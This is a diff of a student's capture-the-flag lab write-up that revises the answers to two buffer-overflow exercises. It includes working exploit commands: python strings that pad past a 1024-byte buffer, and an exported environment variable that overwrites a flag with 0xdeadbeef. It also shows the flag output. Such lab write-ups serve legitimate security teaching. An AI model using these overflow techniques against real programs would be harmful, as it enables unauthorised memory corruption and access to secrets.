@@ -10,7 +10,7 @@
 > **Answer:**
 To exploit the program and obtain the secret, we target the buffer overflow vulnerability caused by `strcpy`. The `buffer` array has 1024 bytes, and `changeme` is immediately after it in memory. To overwrite `changeme`, our input needs to exceed the `buffer` size and alter `changeme`'s value from 0.
 > 
-> By supplying an input of 1028 characters, we overflow `buffer` and change at least one byte of `changeme`, triggering the conditional to reveal the secret.
+> By supplying an input of 1025 characters, we overflow `buffer` and change at least one byte of `changeme`, triggering the conditional to reveal the secret.
 >```
 >student@hacklabvm:/home/q1$ ./run_me $(python -c 'print("A"*1025)')
  >_________________________________________
@@ -159,13 +159,33 @@ lrwxrwxrwx  1 student student   15 Mar 28 03:58 secet -> /home/q5/secret
 
 ###### Exercise 6
 
-
 > [!exercise]+ Exercise 6
-> Another straightforward one. We need to once again cause a buffer overflow and overwrite the `flag` variable. To do this, add the hex code as an environment variable to `Q6_SECRET_CODE` padded with junk data. We can use `export` for this. 
+> Go to /home/q6/. Exploit the program to get the secret.
+> 
+> **Answer:**
+> Another straightforward one. We need to once again cause a buffer overflow and overwrite the `flag` variable with `0xdeadbeef`. To do this, add the hex code as an environment variable to `Q6_SECRET_CODE` padded with prepended junk data. We can use `export` for this. 
 > 
 > ```
-> export Q6_SECRET_CODE=$(python -c 'print("A"*1024 + "\xef\xbe\xad\xde")')
-
+> export Q6_SECRET_CODE=$(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*1024 + b"\xef\xbe\xad\xde")')
+>```
+>
+>Then we simply execute the program.
+>
+>```
+>student@hacklabvm:/home/q6$ ./run_me
+> _________________________________________
+>/ csf2024s1_{linkages-lunchtime-bepillare \
+>\ d}                                      /
+> -----------------------------------------
+>  \
+>   \
+>       __     
+>      UooU\.'@@@@@@`.
+>      \__/(@@@@@@@@@@)
+>           (@@@@@@@@)
+>           `YY~~~~YY'
+>            ||    ||
+>student@hacklabvm:/home/q6$ 
 >```
 
 
